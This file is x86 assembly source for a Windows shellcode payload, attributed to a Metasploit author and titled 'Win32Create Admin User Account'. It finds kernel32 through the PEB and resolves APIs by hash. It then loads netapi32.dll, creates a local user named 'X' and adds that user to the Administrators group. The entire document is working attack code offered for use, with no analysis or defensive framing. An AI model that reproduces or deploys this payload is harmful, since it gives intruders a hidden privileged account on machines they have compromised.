;      Title:  Win32Create Admin User Account
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP
;   Function:  NetUserAdd(X);  NetLocalGroupAddMembers(X, Administrators);
;     Author:  hdm[at]metasploit.com


[BITS 32]

global _start

_start:

	sub sp, 128

	mov esi, esp

	;	[esi]
	;	    00 kernel32.dll
	;		04 netapi32.dll
	;		08 LoadLibraryA
	;		12 ExitProcess
	;		16 NetUserAdd
	;		20 NetLocalGroupAddMembers
	;		24 user/pass
	;		28 group


    ; get base kernel32 address
	call LK32Base
	mov [esi], eax
    mov ebx, eax

	; GetProcAddress(ExitProcess)
	push ebx
	push 0x73e2d87e
	call LGetProcAddress
	mov [esi + 12], eax

    ; GetProcAddress(LoadLibraryA)
    push ebx
	push 0xec0e4e8e
	call LGetProcAddress
	mov [esi + 8], eax

	; LoadLibrary(netapi32.dll)
	xor ebx, ebx
	push	ebx
	push	0x32336970
	push	0x6174656e
	push	esp
	call	eax
	mov [esi + 4], eax
    mov ebx, eax

	; GetProcAddress(NetUserAdd)
	push ebx
	push 0xcd7cdf5e
	call LGetProcAddress
	mov [esi + 16], eax

	; GetProcAddress(NetLocalGroupAddMembers)
	push ebx
	push  0xc30c3dd7
	call LGetProcAddress
	mov [esi + 20], eax

    ; useful register values
	xor eax, eax
	xor ebx, ebx
	inc ebx

    ; push the group (Administrators)
	push eax
	push 0x00730072
	push 0x006f0074
	push 0x00610072
	push 0x00740073
	push 0x0069006e
	push 0x0069006d
	push 0x00640041
	mov [esi + 28], esp

	; push the username (X)
	push eax
	push 0x00000058
	mov	 ecx, esp
	mov [esi + 24], ecx

    ; add the \ to the username
	push 0x005c0000

    ; create the NetUserAdd arguments
	push eax
	push ebx
	push eax
	push eax
	push ebx
	push eax
	push ecx
	push ecx
	mov ecx, esp

	push eax
	push esp
	push ecx
	push ebx
	push eax

    ; call NetUserAdd(X)
	call [esi + 16]

    ; create the NetLocalGroupAddMembers arguments
	mov ecx, [esi + 24]
	dec ecx
	dec ecx
	push ecx
	mov ecx, esp

	push byte 1
	push ecx
	push byte 3
	push dword [esi + 28]
	push byte 0

    ; call NetLocalGroupAddMembers
	call [esi + 20]

LFinished:

	call [esi + 12]

LK32Base:
	push esi
    push byte 0x30
    pop ecx
	mov eax, [fs:ecx]
	mov eax, [eax + 0x0c]
	mov esi, [eax + 0x1c]
	lodsd
	mov eax, [eax + 0x08]
	pop esi
	ret 4

LGetProcAddress:

	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]
	mov eax, [ebp + 0x3c]
	mov edx, [ebp + eax + 120]
	add edx, ebp
	mov ecx, [edx + 24]
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:

	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp
	xor edi, edi
	cld

LHshlp:

	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:

	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]
	mov ebx, [edx + 28]
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]
	add eax, ebp
	jmp short LDone

LNtfnd:

	xor eax, eax

LDone:
	mov edx, ebp
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8